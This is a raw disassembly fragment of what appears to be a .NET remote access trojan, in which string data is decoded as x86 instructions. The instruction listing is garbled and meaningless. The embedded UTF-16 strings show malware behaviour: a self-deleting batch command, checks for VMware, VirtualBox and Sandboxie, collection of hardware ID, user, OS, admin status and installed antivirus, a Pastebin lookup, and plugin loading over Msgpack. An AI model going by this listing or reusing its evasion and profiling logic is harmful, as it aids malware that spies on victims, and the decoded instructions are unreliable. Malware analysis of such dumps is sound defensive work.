  407424:	74 00                	je     0x407426
  407426:	20 00                	and    %al,(%eax)
  407428:	33 00                	xor    (%eax),%eax
  40742a:	20 00                	and    %al,(%eax)
  40742c:	3e 00 20             	add    %ah,%ds:(%eax)
  40742f:	00 4e 00             	add    %cl,0x0(%esi)
  407432:	55                   	push   %ebp
  407433:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407437:	15 53 00 54 00       	adc    $0x540053,%eax
  40743c:	41                   	inc    %ecx
  40743d:	00 52 00             	add    %dl,0x0(%edx)
  407440:	54                   	push   %esp
  407441:	00 20                	add    %ah,(%eax)
  407443:	00 22                	add    %ah,(%edx)
  407445:	00 22                	add    %ah,(%edx)
  407447:	00 20                	add    %ah,(%eax)
  407449:	00 22                	add    %ah,(%edx)
  40744b:	00 00                	add    %al,(%eax)
  40744d:	07                   	pop    %es
  40744e:	43                   	inc    %ebx
  40744f:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  407453:	00 00                	add    %al,(%eax)
  407455:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  407459:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40745d:	00 22                	add    %ah,(%edx)
  40745f:	00 00                	add    %al,(%eax)
  407461:	0f 22 00             	mov    %eax,%cr0
  407464:	20 00                	and    %al,(%eax)
  407466:	2f                   	das
  407467:	00 66 00             	add    %ah,0x0(%esi)
  40746a:	20 00                	and    %al,(%eax)
  40746c:	2f                   	das
  40746d:	00 71 00             	add    %dh,0x0(%ecx)
  407470:	00 23                	add    %ah,(%ebx)
  407472:	49                   	dec    %ecx
  407473:	00 6e 00             	add    %ch,0x0(%esi)
  407476:	73 00                	jae    0x407478
  407478:	74 00                	je     0x40747a
  40747a:	61                   	popa
  40747b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40747f:	00 20                	add    %ah,(%eax)
  407481:	00 46 00             	add    %al,0x0(%esi)
  407484:	61                   	popa
  407485:	00 69 00             	add    %ch,0x0(%ecx)
  407488:	6c                   	insb   (%dx),%es:(%edi)
  407489:	00 65 00             	add    %ah,0x0(%ebp)
  40748c:	64 00 20             	add    %ah,%fs:(%eax)
  40748f:	00 3a                	add    %bh,(%edx)
  407491:	00 20                	add    %ah,(%eax)
  407493:	00 00                	add    %al,(%eax)
  407495:	05 78 00 70 00       	add    $0x700078,%eax
  40749a:	00 45 53             	add    %al,0x53(%ebp)
  40749d:	00 65 00             	add    %ah,0x0(%ebp)
  4074a0:	6c                   	insb   (%dx),%es:(%edi)
  4074a1:	00 65 00             	add    %ah,0x0(%ebp)
  4074a4:	63 00                	arpl   %eax,(%eax)
  4074a6:	74 00                	je     0x4074a8
  4074a8:	20 00                	and    %al,(%eax)
  4074aa:	2a 00                	sub    (%eax),%al
  4074ac:	20 00                	and    %al,(%eax)
  4074ae:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4074b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4074b3:	00 6d 00             	add    %ch,0x0(%ebp)
  4074b6:	20 00                	and    %al,(%eax)
  4074b8:	57                   	push   %edi
  4074b9:	00 69 00             	add    %ch,0x0(%ecx)
  4074bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4074bd:	00 33                	add    %dh,(%ebx)
  4074bf:	00 32                	add    %dh,(%edx)
  4074c1:	00 5f 00             	add    %bl,0x0(%edi)
  4074c4:	43                   	inc    %ebx
  4074c5:	00 6f 00             	add    %ch,0x0(%edi)
  4074c8:	6d                   	insl   (%dx),%es:(%edi)
  4074c9:	00 70 00             	add    %dh,0x0(%eax)
  4074cc:	75 00                	jne    0x4074ce
  4074ce:	74 00                	je     0x4074d0
  4074d0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074d4:	53                   	push   %ebx
  4074d5:	00 79 00             	add    %bh,0x0(%ecx)
  4074d8:	73 00                	jae    0x4074da
  4074da:	74 00                	je     0x4074dc
  4074dc:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4074e0:	00 19                	add    %bl,(%ecx)
  4074e2:	4d                   	dec    %ebp
  4074e3:	00 61 00             	add    %ah,0x0(%ecx)
  4074e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074e7:	00 75 00             	add    %dh,0x0(%ebp)
  4074ea:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4074ee:	63 00                	arpl   %eax,(%eax)
  4074f0:	74 00                	je     0x4074f2
  4074f2:	75 00                	jne    0x4074f4
  4074f4:	72 00                	jb     0x4074f6
  4074f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074fa:	00 2b                	add    %ch,(%ebx)
  4074fc:	6d                   	insl   (%dx),%es:(%edi)
  4074fd:	00 69 00             	add    %ch,0x0(%ecx)
  407500:	63 00                	arpl   %eax,(%eax)
  407502:	72 00                	jb     0x407504
  407504:	6f                   	outsl  %ds:(%esi),(%dx)
  407505:	00 73 00             	add    %dh,0x0(%ebx)
  407508:	6f                   	outsl  %ds:(%esi),(%dx)
  407509:	00 66 00             	add    %ah,0x0(%esi)
  40750c:	74 00                	je     0x40750e
  40750e:	20 00                	and    %al,(%eax)
  407510:	63 00                	arpl   %eax,(%eax)
  407512:	6f                   	outsl  %ds:(%esi),(%dx)
  407513:	00 72 00             	add    %dh,0x0(%edx)
  407516:	70 00                	jo     0x407518
  407518:	6f                   	outsl  %ds:(%esi),(%dx)
  407519:	00 72 00             	add    %dh,0x0(%edx)
  40751c:	61                   	popa
  40751d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407521:	00 6f 00             	add    %ch,0x0(%edi)
  407524:	6e                   	outsb  %ds:(%esi),(%dx)
  407525:	00 00                	add    %al,(%eax)
  407527:	0b 4d 00             	or     0x0(%ebp),%ecx
  40752a:	6f                   	outsl  %ds:(%esi),(%dx)
  40752b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40752f:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407533:	0f 56 00             	orps   (%eax),%xmm0
  407536:	49                   	dec    %ecx
  407537:	00 52 00             	add    %dl,0x0(%edx)
  40753a:	54                   	push   %esp
  40753b:	00 55 00             	add    %dl,0x0(%ebp)
  40753e:	41                   	inc    %ecx
  40753f:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407543:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  407548:	77 00                	ja     0x40754a
  40754a:	61                   	popa
  40754b:	00 72 00             	add    %dh,0x0(%edx)
  40754e:	65 00 00             	add    %al,%gs:(%eax)
  407551:	15 56 00 69 00       	adc    $0x690056,%eax
  407556:	72 00                	jb     0x407558
  407558:	74 00                	je     0x40755a
  40755a:	75 00                	jne    0x40755c
  40755c:	61                   	popa
  40755d:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  407561:	00 6f 00             	add    %ch,0x0(%edi)
  407564:	78 00                	js     0x407566
  407566:	00 17                	add    %dl,(%edi)
  407568:	53                   	push   %ebx
  407569:	00 62 00             	add    %ah,0x0(%edx)
  40756c:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  407572:	6c                   	insb   (%dx),%es:(%edi)
  407573:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407577:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40757b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40757f:	11 45 00             	adc    %eax,0x0(%ebp)
  407582:	72 00                	jb     0x407584
  407584:	72 00                	jb     0x407586
  407586:	20 00                	and    %al,(%eax)
  407588:	48                   	dec    %eax
  407589:	00 57 00             	add    %dl,0x0(%edi)
  40758c:	49                   	dec    %ecx
  40758d:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  407591:	05 78 00 32 00       	add    $0x320078,%eax
  407596:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40759c:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  4075a2:	74 00                	je     0x4075a4
  4075a4:	49                   	dec    %ecx
  4075a5:	00 6e 00             	add    %ch,0x0(%esi)
  4075a8:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4075ac:	00 09                	add    %cl,(%ecx)
  4075ae:	48                   	dec    %eax
  4075af:	00 57 00             	add    %dl,0x0(%edi)
  4075b2:	49                   	dec    %ecx
  4075b3:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4075b7:	09 55 00             	or     %edx,0x0(%ebp)
  4075ba:	73 00                	jae    0x4075bc
  4075bc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4075c0:	00 05 4f 00 53 00    	add    %al,0x53004f
  4075c6:	00 13                	add    %dl,(%ebx)
  4075c8:	4d                   	dec    %ebp
  4075c9:	00 69 00             	add    %ch,0x0(%ecx)
  4075cc:	63 00                	arpl   %eax,(%eax)
  4075ce:	72 00                	jb     0x4075d0
  4075d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d1:	00 73 00             	add    %dh,0x0(%ebx)
  4075d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d5:	00 66 00             	add    %ah,0x0(%esi)
  4075d8:	74 00                	je     0x4075da
  4075da:	00 03                	add    %al,(%ebx)
  4075dc:	20 00                	and    %al,(%eax)
  4075de:	00 09                	add    %cl,(%ecx)
  4075e0:	54                   	push   %esp
  4075e1:	00 72 00             	add    %dh,0x0(%edx)
  4075e4:	75 00                	jne    0x4075e6
  4075e6:	65 00 00             	add    %al,%gs:(%eax)
  4075e9:	0b 36                	or     (%esi),%esi
  4075eb:	00 34 00             	add    %dh,(%eax,%eax,1)
  4075ee:	62 00                	bound  %eax,(%eax)
  4075f0:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  4075f6:	46                   	inc    %esi
  4075f7:	00 61 00             	add    %ah,0x0(%ecx)
  4075fa:	6c                   	insb   (%dx),%es:(%edi)
  4075fb:	00 73 00             	add    %dh,0x0(%ebx)
  4075fe:	65 00 00             	add    %al,%gs:(%eax)
  407601:	0b 33                	or     (%ebx),%esi
  407603:	00 32                	add    %dh,(%edx)
  407605:	00 62 00             	add    %ah,0x0(%edx)
  407608:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40760e:	50                   	push   %eax
  40760f:	00 61 00             	add    %ah,0x0(%ecx)
  407612:	74 00                	je     0x407614
  407614:	68 00 00 0f 56       	push   $0x560f0000
  407619:	00 65 00             	add    %ah,0x0(%ebp)
  40761c:	72 00                	jb     0x40761e
  40761e:	73 00                	jae    0x407620
  407620:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407626:	00 0b                	add    %cl,(%ebx)
  407628:	41                   	inc    %ecx
  407629:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40762d:	00 69 00             	add    %ch,0x0(%ecx)
  407630:	6e                   	outsb  %ds:(%esi),(%dx)
  407631:	00 00                	add    %al,(%eax)
  407633:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  407637:	00 75 00             	add    %dh,0x0(%ebp)
  40763a:	65 00 00             	add    %al,%gs:(%eax)
  40763d:	17                   	pop    %ss
  40763e:	50                   	push   %eax
  40763f:	00 65 00             	add    %ah,0x0(%ebp)
  407642:	72 00                	jb     0x407644
  407644:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  407648:	72 00                	jb     0x40764a
  40764a:	6d                   	insl   (%dx),%es:(%edi)
  40764b:	00 61 00             	add    %ah,0x0(%ecx)
  40764e:	6e                   	outsb  %ds:(%esi),(%dx)
  40764f:	00 63 00             	add    %ah,0x0(%ebx)
  407652:	65 00 00             	add    %al,%gs:(%eax)
  407655:	11 50 00             	adc    %edx,0x0(%eax)
  407658:	61                   	popa
  407659:	00 73 00             	add    %dh,0x0(%ebx)
  40765c:	74 00                	je     0x40765e
  40765e:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  407662:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  407668:	41                   	inc    %ecx
  407669:	00 6e 00             	add    %ch,0x0(%esi)
  40766c:	74 00                	je     0x40766e
  40766e:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407674:	72 00                	jb     0x407676
  407676:	75 00                	jne    0x407678
  407678:	73 00                	jae    0x40767a
  40767a:	00 13                	add    %dl,(%ebx)
  40767c:	49                   	dec    %ecx
  40767d:	00 6e 00             	add    %ch,0x0(%esi)
  407680:	73 00                	jae    0x407682
  407682:	74 00                	je     0x407684
  407684:	61                   	popa
  407685:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407689:	00 65 00             	add    %ah,0x0(%ebp)
  40768c:	64 00 00             	add    %al,%fs:(%eax)
  40768f:	09 50 00             	or     %edx,0x0(%eax)
  407692:	6f                   	outsl  %ds:(%esi),(%dx)
  407693:	00 6e 00             	add    %ch,0x0(%esi)
  407696:	67 00 00             	add    %al,(%bx,%si)
  407699:	0b 47 00             	or     0x0(%edi),%eax
  40769c:	72 00                	jb     0x40769e
  40769e:	6f                   	outsl  %ds:(%esi),(%dx)
  40769f:	00 75 00             	add    %dh,0x0(%ebp)
  4076a2:	70 00                	jo     0x4076a4
  4076a4:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  4076aa:	00 2b                	add    %ch,(%ebx)
  4076ac:	5c                   	pop    %esp
  4076ad:	00 72 00             	add    %dh,0x0(%edx)
  4076b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b1:	00 6f 00             	add    %ch,0x0(%edi)
  4076b4:	74 00                	je     0x4076b6
  4076b6:	5c                   	pop    %esp
  4076b7:	00 53 00             	add    %dl,0x0(%ebx)
  4076ba:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4076be:	75 00                	jne    0x4076c0
  4076c0:	72 00                	jb     0x4076c2
  4076c2:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4076c8:	43                   	inc    %ebx
  4076c9:	00 65 00             	add    %ah,0x0(%ebp)
  4076cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4076cd:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4076d1:	00 72 00             	add    %dh,0x0(%edx)
  4076d4:	32 00                	xor    (%eax),%al
  4076d6:	00 3d 53 00 65 00    	add    %bh,0x650053
  4076dc:	6c                   	insb   (%dx),%es:(%edi)
  4076dd:	00 65 00             	add    %ah,0x0(%ebp)
  4076e0:	63 00                	arpl   %eax,(%eax)
  4076e2:	74 00                	je     0x4076e4
  4076e4:	20 00                	and    %al,(%eax)
  4076e6:	2a 00                	sub    (%eax),%al
  4076e8:	20 00                	and    %al,(%eax)
  4076ea:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4076ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ef:	00 6d 00             	add    %ch,0x0(%ebp)
  4076f2:	20 00                	and    %al,(%eax)
  4076f4:	41                   	inc    %ecx
  4076f5:	00 6e 00             	add    %ch,0x0(%esi)
  4076f8:	74 00                	je     0x4076fa
  4076fa:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407700:	72 00                	jb     0x407702
  407702:	75 00                	jne    0x407704
  407704:	73 00                	jae    0x407706
  407706:	50                   	push   %eax
  407707:	00 72 00             	add    %dh,0x0(%edx)
  40770a:	6f                   	outsl  %ds:(%esi),(%dx)
  40770b:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40770f:	00 63 00             	add    %ah,0x0(%ebx)
  407712:	74 00                	je     0x407714
  407714:	00 17                	add    %dl,(%edi)
  407716:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40771a:	73 00                	jae    0x40771c
  40771c:	70 00                	jo     0x40771e
  40771e:	6c                   	insb   (%dx),%es:(%edi)
  40771f:	00 61 00             	add    %ah,0x0(%ecx)
  407722:	79 00                	jns    0x407724
  407724:	4e                   	dec    %esi
  407725:	00 61 00             	add    %ah,0x0(%ecx)
  407728:	6d                   	insl   (%dx),%es:(%edi)
  407729:	00 65 00             	add    %ah,0x0(%ebp)
  40772c:	00 07                	add    %al,(%edi)
  40772e:	4e                   	dec    %esi
  40772f:	00 2f                	add    %ch,(%edi)
  407731:	00 41 00             	add    %al,0x0(%ecx)
  407734:	00 05 2c 00 20 00    	add    %al,0x20002c
  40773a:	00 13                	add    %dl,(%ebx)
  40773c:	53                   	push   %ebx
  40773d:	00 6f 00             	add    %ch,0x0(%edi)
  407740:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  407745:	00 61 00             	add    %ah,0x0(%ecx)
  407748:	72 00                	jb     0x40774a
  40774a:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40774f:	09 70 00             	or     %esi,0x0(%eax)
  407752:	6f                   	outsl  %ds:(%esi),(%dx)
  407753:	00 6e 00             	add    %ch,0x0(%esi)
  407756:	67 00 00             	add    %al,(%bx,%si)
  407759:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40775e:	75 00                	jne    0x407760
  407760:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407764:	6e                   	outsb  %ds:(%esi),(%dx)
  407765:	00 00                	add    %al,(%eax)
  407767:	15 73 00 61 00       	adc    $0x610073,%eax
  40776c:	76 00                	jbe    0x40776e
  40776e:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  407772:	6c                   	insb   (%dx),%es:(%edi)
  407773:	00 75 00             	add    %dh,0x0(%ebp)
  407776:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40777a:	6e                   	outsb  %ds:(%esi),(%dx)
  40777b:	00 00                	add    %al,(%eax)
  40777d:	07                   	pop    %es
  40777e:	44                   	inc    %esp
  40777f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407783:	00 00                	add    %al,(%eax)
  407785:	15 73 00 65 00       	adc    $0x650073,%eax
  40778a:	6e                   	outsb  %ds:(%esi),(%dx)
  40778b:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40778f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  407793:	00 67 00             	add    %ah,0x0(%edi)
  407796:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40779c:	48                   	dec    %eax
  40779d:	00 61 00             	add    %ah,0x0(%ecx)
  4077a0:	73 00                	jae    0x4077a2
  4077a2:	68 00 65 00 73       	push   $0x73006500
  4077a7:	00 00                	add    %al,(%eax)
  4077a9:	09 48 00             	or     %ecx,0x0(%eax)
  4077ac:	61                   	popa
  4077ad:	00 73 00             	add    %dh,0x0(%ebx)
  4077b0:	68 00 00 19 70       	push   $0x70190000
  4077b5:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4077b9:	00 67 00             	add    %ah,0x0(%edi)
  4077bc:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4077c2:	73 00                	jae    0x4077c4
  4077c4:	61                   	popa
  4077c5:	00 76 00             	add    %dh,0x0(%esi)
  4077c8:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4077cd:	1b 50 00             	sbb    0x0(%eax),%edx
  4077d0:	6c                   	insb   (%dx),%es:(%edi)
  4077d1:	00 75 00             	add    %dh,0x0(%ebp)
  4077d4:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4077d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d9:	00 2e                	add    %ch,(%esi)
  4077db:	00 50 00             	add    %dl,0x0(%eax)
  4077de:	6c                   	insb   (%dx),%es:(%edi)
  4077df:	00 75 00             	add    %dh,0x0(%ebp)
  4077e2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4077e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e7:	00 00                	add    %al,(%eax)
  4077e9:	07                   	pop    %es
  4077ea:	52                   	push   %edx
  4077eb:	00 75 00             	add    %dh,0x0(%ebp)
  4077ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4077ef:	00 00                	add    %al,(%eax)
  4077f1:	0f 4d 00             	cmovge (%eax),%eax
  4077f4:	73 00                	jae    0x4077f6
  4077f6:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  4077fa:	61                   	popa
  4077fb:	00 63 00             	add    %ah,0x0(%ebx)
  4077fe:	6b 00 00             	imul   $0x0,(%eax),%eax
  407801:	11 52 00             	adc    %edx,0x0(%edx)
  407804:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407808:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40780c:	76 00                	jbe    0x40780e
  40780e:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407813:	0b 45 00             	or     0x0(%ebp),%eax
  407816:	72 00                	jb     0x407818
  407818:	72 00                	jb     0x40781a
  40781a:	6f                   	outsl  %ds:(%esi),(%dx)
  40781b:	00 72 00             	add    %dh,0x0(%edx)
  40781e:	00 47 6d             	add    %al,0x6d(%edi)
  407821:	00 61 00             	add    %ah,0x0(%ecx)
  407824:	73 00                	jae    0x407826
  407826:	74 00                	je     0x407828
  407828:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40782c:	4b                   	dec    %ebx
  40782d:	00 65 00             	add    %ah,0x0(%ebp)
  407830:	79 00                	jns    0x407832
  407832:	20 00                	and    %al,(%eax)
  407834:	63 00                	arpl   %eax,(%eax)
  407836:	61                   	popa
  407837:	00 6e 00             	add    %ch,0x0(%esi)
  40783a:	20 00                	and    %al,(%eax)
  40783c:	6e                   	outsb  %ds:(%esi),(%dx)
  40783d:	00 6f 00             	add    %ch,0x0(%edi)
  407840:	74 00                	je     0x407842
  407842:	20 00                	and    %al,(%eax)
  407844:	62 00                	bound  %eax,(%eax)
  407846:	65 00 20             	add    %ah,%gs:(%eax)
  407849:	00 6e 00             	add    %ch,0x0(%esi)
  40784c:	75 00                	jne    0x40784e
  40784e:	6c                   	insb   (%dx),%es:(%edi)
  40784f:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  407853:	00 6f 00             	add    %ch,0x0(%edi)
  407856:	72 00                	jb     0x407858
  407858:	20 00                	and    %al,(%eax)
  40785a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40785e:	70 00                	jo     0x407860
  407860:	74 00                	je     0x407862
  407862:	79 00                	jns    0x407864
  407864:	2e 00 00             	add    %al,%cs:(%eax)
  407867:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40786c:	70 00                	jo     0x40786e
  40786e:	75 00                	jne    0x407870
  407870:	74 00                	je     0x407872
  407872:	20 00                	and    %al,(%eax)
  407874:	63 00                	arpl   %eax,(%eax)
  407876:	61                   	popa
  407877:	00 6e 00             	add    %ch,0x0(%esi)
  40787a:	20 00                	and    %al,(%eax)
  40787c:	6e                   	outsb  %ds:(%esi),(%dx)
  40787d:	00 6f 00             	add    %ch,0x0(%edi)
  407880:	74 00                	je     0x407882
  407882:	20 00                	and    %al,(%eax)
  407884:	62 00                	bound  %eax,(%eax)
  407886:	65 00 20             	add    %ah,%gs:(%eax)
  407889:	00 6e 00             	add    %ch,0x0(%esi)
  40788c:	75 00                	jne    0x40788e
  40788e:	6c                   	insb   (%dx),%es:(%edi)
  40788f:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407893:	00 00                	add    %al,(%eax)
  407895:	55                   	push   %ebp
  407896:	49                   	dec    %ecx
  407897:	00 6e 00             	add    %ch,0x0(%esi)
  40789a:	76 00                	jbe    0x40789c
  40789c:	61                   	popa
  40789d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4078a1:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4078a5:	00 6d 00             	add    %ch,0x0(%ebp)
  4078a8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4078ac:	73 00                	jae    0x4078ae
  4078ae:	61                   	popa
  4078af:	00 67 00             	add    %ah,0x0(%edi)
  4078b2:	65 00 20             	add    %ah,%gs:(%eax)
  4078b5:	00 61 00             	add    %ah,0x0(%ecx)
  4078b8:	75 00                	jne    0x4078ba
  4078ba:	74 00                	je     0x4078bc
  4078bc:	68 00 65 00 6e       	push   $0x6e006500
  4078c1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4078c5:	00 63 00             	add    %ah,0x0(%ebx)
  4078c8:	61                   	popa
  4078c9:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4078cd:	00 6f 00             	add    %ch,0x0(%edi)
  4078d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d1:	00 20                	add    %ah,(%eax)
  4078d3:	00 63 00             	add    %ah,0x0(%ebx)
  4078d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4078db:	00 20                	add    %ah,(%eax)
  4078dd:	00 28                	add    %ch,(%eax)
  4078df:	00 4d 00             	add    %cl,0x0(%ebp)
  4078e2:	41                   	inc    %ecx
  4078e3:	00 43 00             	add    %al,0x0(%ebx)
  4078e6:	29 00                	sub    %eax,(%eax)
  4078e8:	2e 00 00             	add    %al,%cs:(%eax)
  4078eb:	05 58 00 32 00       	add    $0x320058,%eax
  4078f0:	00 00                	add    %al,(%eax)
  4078f2:	00 00                	add    %al,(%eax)
  4078f4:	fc                   	cld
  4078f5:	9e                   	sahf
  4078f6:	5f                   	pop    %edi
  4078f7:	18 62 27             	sbb    %ah,0x27(%edx)
  4078fa:	7f 42                	jg     0x40793e
  4078fc:	8c b7 cd e8 46 53    	mov    %?,0x5346e8cd(%edi)
  407902:	f9                   	stc
  407903:	4b                   	dec    %ebx
  407904:	00 04 20             	add    %al,(%eax,%eiz,1)
  407907:	01 01                	add    %eax,(%ecx)
  407909:	08 03                	or     %al,(%ebx)
  40790b:	20 00                	and    %al,(%eax)
  40790d:	01 05 20 01 01 11    	add    %eax,0x11010120
  407913:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407916:	01 01                	add    %eax,(%ecx)
  407918:	0e                   	push   %cs
  407919:	04 20                	add    $0x20,%al
  40791b:	01 01                	add    %eax,(%ecx)
  40791d:	02 05 20 01 01 11    	add    0x11010120,%al
  407923:	51                   	push   %ecx
  407924:	0b 07                	or     (%edi),%eax
  407926:	09 08                	or     %ecx,(%eax)
  407928:	02 02                	add    (%edx),%al
  40792a:	02 02                	add    (%edx),%al
  40792c:	02 02                	add    (%edx),%al
  40792e:	02 02                	add    (%edx),%al
  407930:	04 00                	add    $0x0,%al
  407932:	01 01                	add    %eax,(%ecx)
  407934:	08 04 00             	or     %al,(%eax,%eax,1)
  407937:	01 08                	add    %ecx,(%eax)
  407939:	0e                   	push   %cs
  40793a:	04 00                	add    $0x0,%al
  40793c:	01 02                	add    %eax,(%edx)
  40793e:	0e                   	push   %cs
  40793f:	03 07                	add    (%edi),%eax
  407941:	01 02                	add    %eax,(%edx)
  407943:	05 07 02 12 45       	add    $0x45120207,%eax
  407948:	02 05 20 00 12 81    	add    0x81120020,%al
  40794e:	11 05 20 00 12 81    	adc    %eax,0x81120020
  407954:	15 05 00 00 12       	adc    $0x12000005,%eax
  407959:	81 19 05 20 01 1d    	sbbl   $0x1d012005,(%ecx)
  40795f:	05 0e 04 00 01       	add    $0x100040e,%eax
  407964:	0e                   	push   %cs
  407965:	0e                   	push   %cs
  407966:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40796b:	0e                   	push   %cs
  40796c:	08 20                	or     %ah,(%eax)
  40796e:	03 02                	add    (%edx),%eax
  407970:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  407975:	18 07                	sbb    %al,(%edi)
  407977:	0e                   	push   %cs
  407978:	02 0e                	add    (%esi),%cl
  40797a:	08 02                	or     %al,(%edx)
  40797c:	1d 12 65 1d 12       	sbb    $0x121d6512,%eax
  407981:	65 08 12             	or     %dl,%gs:(%edx)
  407984:	65 02 12             	add    %gs:(%edx),%dl
  407987:	69 12 6d 0e 1d 0e    	imul   $0xe1d0e6d,(%edx),%edx
  40798d:	02 0c 20             	add    (%eax,%eiz,1),%cl
  407990:	03 01                	add    (%ecx),%eax
  407992:	11 81 21 11 81 25    	adc    %eax,0x25811121(%ecx)
  407998:	11 81 29 05 00 02    	adc    %eax,0x2000529(%ecx)
  40799e:	02 0e                	add    (%esi),%cl
  4079a0:	0e                   	push   %cs
  4079a1:	06                   	push   %es
  4079a2:	20 01                	and    %al,(%ecx)
  4079a4:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  4079a9:	20 01                	and    %al,(%ecx)
  4079ab:	08 08                	or     %cl,(%eax)
  4079ad:	06                   	push   %es
  4079ae:	00 01                	add    %al,(%ecx)
  4079b0:	1d 12 65 0e 06       	sbb    $0x60e6512,%eax
  4079b5:	20 02                	and    %al,(%edx)
  4079b7:	01 12                	add    %edx,(%edx)
  4079b9:	65 08 03             	or     %al,%gs:(%ebx)
  4079bc:	20 00                	and    %al,(%eax)
  4079be:	02 05 20 02 01 0e    	add    0xe010220,%al
  4079c4:	08 05 20 02 01 0e    	or     %al,0xe010220
  4079ca:	0e                   	push   %cs
  4079cb:	06                   	push   %es
  4079cc:	20 01                	and    %al,(%ecx)
  4079ce:	01 12                	add    %edx,(%edx)
  4079d0:	81 3d 04 20 01 0e 0e 	cmpl   $0x220090e,0xe012004
  4079d7:	09 20 02 
  4079da:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  4079df:	81 41 05 20 02 08 08 	addl   $0x8080220,0x5(%ecx)
  4079e6:	08 04 00             	or     %al,(%eax,%eax,1)
  4079e9:	01 01                	add    %eax,(%ecx)
  4079eb:	0e                   	push   %cs
  4079ec:	06                   	push   %es
  4079ed:	20 02                	and    %al,(%edx)
  4079ef:	01 12                	add    %edx,(%edx)
  4079f1:	59                   	pop    %ecx
